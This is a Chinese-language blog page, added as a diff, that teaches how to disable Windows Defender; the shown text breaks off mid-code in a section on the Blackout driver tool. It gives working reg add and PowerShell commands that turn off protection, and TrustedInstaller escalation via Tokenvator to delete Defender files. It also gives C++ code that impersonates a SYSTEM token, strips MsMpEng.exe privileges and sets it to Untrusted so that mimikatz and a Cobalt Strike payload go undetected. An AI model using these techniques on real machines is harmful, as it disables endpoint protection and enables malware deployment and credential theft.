@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 6.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="John Doe">
+  
+
+  
+
+  
+
+  <title>Hexo</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css">
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap"></h1>
+          <h2 class="title-sub-wrap">
+            <strong>John Doe</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2023-10-22T08:51:11.603Z" itemprop="datePublished">2023-10-22</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-08-25T18:09:52.000Z" itemprop="dateUpdated">2023-08-26</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着数字技术的日益进步，我们的生活、工作和娱乐越来越依赖于计算机和网络系统。然而，与此同时，恶意软件也日趋猖獗，寻求窃取信息、破坏系统或仅仅为了展现其能力。微软Windows，作为世界上最流行的操作系统，不断受到这些恶意软件的攻击。为了对抗这些潜在的威胁，微软推出了Windows Defender，一款集成于Windows内部的免费反恶意软件工具</p>
+<p>本文将深入探讨如何与Windows Defender对抗，以及那些特殊手段是如何被利用来破坏或关闭Defender的。</p>
+<h1 id="修改注册表关闭Defender"><a href="#修改注册表关闭Defender" class="headerlink" title="修改注册表关闭Defender"></a>修改注册表关闭Defender</h1><h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p>打开注册表，在<code>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender</code>键下有两个名为<code>DisableAntiSpyware</code>和<code>DisableAntiVirus</code>的值，当着两个值被置为1时表示关闭Windows Defender的反间谍软件和反病毒功能</p>
+<p><img src="/WeakDefender/image-20230823121723961.png" alt="image-20230823121723961"></p>
+<p><img src="/WeakDefender/image-20230823121730953.png" alt="image-20230823121730953"></p>
+<p>​	</p>
+<p>启用管理员权限打开cmd，执行如下命令修改注册表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t reg_dword /d 1 /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiVirus /t reg_dword /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="/WeakDefender/image-20230823122459298.png" alt="image-20230823122459298"></p>
+<p>修改完注册表后还需重启操作系统才算真正的关闭Defender。重启系统后，虽然defender看起来是正常运行的，但是我们上传一个CS马上去它也不会查杀</p>
+<img src="WeakDefender/image-20230823122528707.png" alt="image-20230823122528707" style="zoom:67%;" />		
+
+
+
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置注册表键值的函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SetRegistryValue</span><span class="params">(HKEY hRootKey, LPCSTR subKey, LPCSTR valueName, DWORD data)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="comment">// 打开指定的注册表键</span></span><br><span class="line">    LONG result = <span class="built_in">RegOpenKeyEx</span>(hRootKey, subKey, <span class="number">0</span>, KEY_SET_VALUE, &amp;hKey);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;打开注册表键失败: &quot;</span> &lt;&lt; subKey &lt;&lt; <span class="string">&quot; 错误码: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置指定的注册表键值</span></span><br><span class="line">    result = <span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_DWORD, (BYTE*)&amp;data, <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;设置注册表值失败: &quot;</span> &lt;&lt; valueName &lt;&lt; <span class="string">&quot; 错误码: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* subKey = <span class="string">&quot;SOFTWARE\\Policies\\Microsoft\\Windows Defender&quot;</span>;</span><br><span class="line">    <span class="comment">// 设置两个注册表键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SetRegistryValue</span>(HKEY_LOCAL_MACHINE, subKey, <span class="string">&quot;DisableAntiSpyware&quot;</span>, <span class="number">1</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">SetRegistryValue</span>(HKEY_LOCAL_MACHINE, subKey, <span class="string">&quot;DisableAntiVirus&quot;</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;注册表键值设置成功!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;设置注册表键值失败.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Powershell关闭Defender实时保护"><a href="#Powershell关闭Defender实时保护" class="headerlink" title="Powershell关闭Defender实时保护"></a>Powershell关闭Defender实时保护</h1><p>执行如下Powershell命令可以关闭Windows Defender的实时保护</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/WeakDefender/image-20230721173120971.png" alt="image-20230721173120971"></p>
+<h1 id="提权至Trustedinstaller"><a href="#提权至Trustedinstaller" class="headerlink" title="提权至Trustedinstaller"></a>提权至Trustedinstaller</h1><h2 id="情景分析"><a href="#情景分析" class="headerlink" title="情景分析"></a>情景分析</h2><p>当我们使用system权限尝试删除WindowsDefender的某些核心文件时，会提示权限不足无法删除</p>
+<p><img src="/WeakDefender/image-20230624203426837.png" alt="image-20230624203426837">	</p>
+<p>这是因为修改WindowsDefender目录里的文件需要<code>TrustedInstaller</code>权限，而我们要做的是将<code>system</code>权限提升至<code>Trustedinstaller</code></p>
+<img src="WeakDefender/image-20230625204420202.png" alt="image-20230625204420202" style="zoom:67%;" />	
+
+
+
+<h2 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h2><p>使用开源的项目<a target="_blank" rel="noopener" href="https://github.com/0xbadjuju/Tokenvator">Tokenvator</a>将system权限提升至TrustedInstaller权限，执行如下命令后会弹出一个cmd shell, 查询其所在组可以发现权限为TrustedInstaller</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\Tokenvator.exe</span><br><span class="line">GetTrustedinstaller /Command:c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/WeakDefender/image-20230624204822742.png" alt="image-20230624204822742"></p>
+<p>提升至Trustedinstaller权限后即可删除windowsdefender的核心文件</p>
+<p><img src="/WeakDefender/image-20230624205722520.png" alt="image-20230624205722520"></p>
+<h1 id="摘除Defender令牌"><a href="#摘除Defender令牌" class="headerlink" title="摘除Defender令牌"></a>摘除Defender令牌</h1><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p><code>MsMpEng.exe</code> 是 Microsoft Windows Defender 的核心进程，Windows Defender 是 Windows 操作系统自带的反病毒软件。此进程名称代表 Microsoft Malware Protection Engine，它负责在你的计算机上扫描、检测和移除恶意软件，通常此进程是加了PPL保护	</p>
+<p><img src="/WeakDefender/image-20230624203033735.png" alt="image-20230624203033735"></p>
+<p>​		</p>
+<p>使用ProcessHacker查看<code>MsmpEng.exe</code>的完整级别为<code>system</code></p>
+<blockquote>
+<p>在Windows操作系统中，完整性级别是一个安全特性，它被设计用来防止低权限的进程影响高权限的进程。这是通过对进程和对象（如文件或注册表键）分配完整性级别来实现的。如果一个进程试图修改一个具有比其更高完整性级别的对象，操作将会失败</p>
+<ul>
+<li><strong>Untrusted (0x0000)</strong>: 这是最低的完整性级别，通常不会分配给进程。</li>
+<li><strong>Low (0x1000)</strong>: 通常用于Web浏览器和其他可能处理不受信任输入的程序。这可以帮助防止恶意软件通过这些程序蔓延到系统的其它部分。</li>
+<li><strong>Medium (0x2000)</strong>: 这是普通用户级别的进程默认的完整性级别。除非另有说明，否则大多数进程将运行在此级别。</li>
+<li><strong>High (0x3000)</strong>: 这是管理员级别的进程的默认完整性级别。如果用户以管理员身份运行程序，那么该程序将运行在此级别。</li>
+<li><strong>System (0x4000)</strong>: 此级别用于操作系统核心和核心模式驱动程序。</li>
+<li><strong>Protected (0x5000)</strong>: 这是Windows 8引入的最高完整性级别，用于保护关键的系统进程。这个级别的进程有防篡改保护，并且只能由具有相同或更高完整性级别的进程访问</li>
+</ul>
+</blockquote>
+<img src="WeakDefender/image-20230624212426260.png" alt="image-20230624212426260" style="zoom:67%;" />			
+
+
+
+<p>如果我们将<code>MsmpEng.exe</code>的完整级别降为Untrusted, 那么该进程对计算机资源的访问将十分有限，由于WindowsDefender的核心服务需要某些令牌，降为Untursted级别后这些令牌都会被摘除掉。如下图所示，我将<code>msedge.exe</code>的integrity降为Untrusted后，edge浏览器就无法打开了</p>
+<p><img src="/WeakDefender/image-20230624215809411.png" alt="image-20230624215809411">	</p>
+<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-开启Debug权限"><a href="#1-开启Debug权限" class="headerlink" title="1.开启Debug权限"></a>1.开启Debug权限</h3><p>通过<code>EnableDebugPrivilege</code>函数开启当前进程的Debug权限，Debug权限允许进程附加到其他进程上以进行调试，以下是<code>EnableDebugPrivilege</code>函数的定义：</p>
+<ul>
+<li>调用<code>OpenProcessToken</code>获取传入进程的访问令牌</li>
+<li>获取到令牌后，函数调用<code>LookupPrivilegeValue</code>函数以获取<code>SE_DEBUG_NAME</code>特权的本地唯一标识符（LUID）</li>
+<li>获取<code>SE_DEBUG_NAME</code>特权的LUID后，函数创建一个<code>TOKEN_PRIVILEGES</code>结构来表示要启用的特权，然后将SE_DEBUG_NAME特权的LUID和启用状态填入到此结构中</li>
+<li>调用<code>AdjustTokenPrivileges</code>来调整之前打开的令牌，使其获得<code>SE_DEBUG_NAME</code>特权</li>
+</ul>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数EnableDebugPrivilege用于启用指定进程的调试权限</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">EnableDebugPrivilege</span><span class="params">(HANDLE ProcHandle, HANDLE* hToken)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID sedebugnameValue; <span class="comment">// LUID，用于表示系统特权</span></span><br><span class="line">    TOKEN_PRIVILEGES tkp; <span class="comment">// 令牌特权结构</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开当前进程的访问令牌</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(ProcHandle, TOKEN_ALL_ACCESS |</span><br><span class="line">        TOKEN_QUERY, hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找 SE_DEBUG_NAME 特权的 LUID</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(*hToken); <span class="comment">// 关闭令牌句柄</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置要调整的特权数量</span></span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue; <span class="comment">// 要启用的特权的 LUID</span></span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 启用该特权</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调整访问令牌的特权</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(*hToken, FALSE, &amp;tkp, <span class="built_in">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 返回true表示成功启用调试特权</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-获取system权限的令牌"><a href="#2-获取system权限的令牌" class="headerlink" title="2.获取system权限的令牌"></a>2.获取system权限的令牌</h3><p>通过获取winlogon.exe进程（该进程以SYSTEM账户运行）的令牌并模拟该用户，这是为了获取到比当前用户更高的权限。</p>
+<p>调用OpenProcessToken()函数获取winlogon.exe进程的令牌, 再调用ImpersonateLoggedOnUser函数将使用获取到的令牌模拟用户登录，如果成功，那么在此后的代码执行过程中，将使用该令牌所代表的用户权限。这里因为<code>winlogon.exe</code>通常是以SYSTEM用户身份运行的，所以相当于得到了SYSTEM的权限</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>; <span class="comment">// 目标进程名称</span></span><br><span class="line"><span class="type">int</span> pid = <span class="built_in">getpid</span>(procname); <span class="comment">// 获取目标进程ID</span></span><br><span class="line">HANDLE phandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid); <span class="comment">// 打开目标进程</span></span><br><span class="line"></span><br><span class="line">HANDLE ptoken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &amp;ptoken); <span class="comment">// 获取目标进程的访问令牌</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试以目标用户身份运行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ImpersonateLoggedOnUser</span>(ptoken)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(phandle);</span><br><span class="line"><span class="built_in">CloseHandle</span>(ptoken);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-降低令牌权限"><a href="#3-降低令牌权限" class="headerlink" title="3.降低令牌权限"></a>3.降低令牌权限</h3><p>以下代码的主要目的是获取<code>MsMpEng.exe</code>的句柄，启用该进程的调试特权，并通过<code>SetPrivilege()</code>函数移除<code>MsMpEng.exe</code>的大部分权限，这使得Windows Defender丧失了很多能力，包括加载驱动程序、更改系统环境、备份文件等</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重复上述步骤，但目标进程改为&quot;MsMpEng.exe&quot;</span></span><br><span class="line"><span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">pid = <span class="built_in">getpid</span>(procname2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Killing Defender...\n&quot;</span>);</span><br><span class="line">phandle = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">EnableDebugPrivilege</span>(phandle,&amp;ptoken);</span><br><span class="line"><span class="comment">// 以下一系列SetPrivilege调用移除了所有特定的权限</span></span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Removed All Privileges\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-设置进程完整级别为Untrusted"><a href="#4-设置进程完整级别为Untrusted" class="headerlink" title="4.设置进程完整级别为Untrusted"></a>4.设置进程完整级别为Untrusted</h3><p>通过<code>SetTokenInformation()</code>函数将MsMpEng.exe的完整性级别设为Untrusted，这是最低的完整性级别，进一步限制了Windows Defender的能力</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置令牌完整性级别为 Untrusted</span></span><br><span class="line">DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br><span class="line">SID integrityLevelSid&#123;&#125;;</span><br><span class="line">integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line">TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">SetTokenInformation</span>(</span><br><span class="line">    ptoken,</span><br><span class="line">    TokenIntegrityLevel,</span><br><span class="line">    &amp;tokenIntegrityLevel,</span><br><span class="line">    <span class="built_in">sizeof</span>(TOKEN_MANDATORY_LABEL) + <span class="built_in">GetLengthSid</span>(&amp;integrityLevelSid)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SetTokenInformation failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Token Integrity set to Untrusted\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>在WindowsServer2019上，使用管理员权限执行<code>Kill_WindowsDefender.exe</code></p>
+<p><img src="/WeakDefender/image-20230624232722573.png" alt="image-20230624232722573">	</p>
+<p>随后用ProcespsHacker查看<code>MsMpEng.exe</code>的完整级别, 可以发现变成了<code>Untrusted</code></p>
+<p><img src="WeakDefender/image-20230624231758421.png" alt="image-20230624231758421" style="zoom:67%;" />‘	</p>
+<p>将WindowsDefender设置为<code>Untrusted</code>级别后，运行mimikatz也不会出现报毒现象</p>
+<img src="WeakDefender/image-20230624233443342.png" alt="image-20230624233443342" style="zoom:67%;" />	
+
+
+
+<p>但是这种方法只能在WindowsServer服务器上使用，无法在Windows10及以上版本使用</p>
+<p><img src="/WeakDefender/image-20230625091215423.png" alt="image-20230625091215423">	</p>
+<h1 id="加载驱动关闭Defender-blackout"><a href="#加载驱动关闭Defender-blackout" class="headerlink" title="加载驱动关闭Defender(blackout)"></a>加载驱动关闭Defender(blackout)</h1><h2 id="项目描述"><a href="#项目描述" class="headerlink" title="项目描述"></a>项目描述</h2><p>blackout项目地址：<a target="_blank" rel="noopener" href="https://github.com/ZeroMemoryEx/Blackout">https://github.com/ZeroMemoryEx/Blackout</a></p>
+<p>Blackout 是一个工具，旨在利用gmer驱动程序来禁用或杀死 EDR 和 AV，特别是那些受到反恶意软件保护的进程。这个工具需要在管理员的上下文中运行，并且可以流畅地绕过 HVCI。</p>
+<p>需将驱动程序 <code>Blackout.sys</code> 和可执行文件放于同一路径，随后使用命令 <code>Blackout.exe -p &lt;process_id&gt;</code> 运行</p>
+<h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><p>此项目主要涉及两个关键的函数，分别是<code>LoadDriver</code>和<code>DeviceIoControl</code></p>
+<p>首先我们来看下<code>LoadDriver</code>函数的定义，其目的是用于加载一个内核驱动。驱动的服务名称被命名为”Blackout”，随后使用<code>CreateServiceA</code> 创建一个新的内核驱动服务，并启动它</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 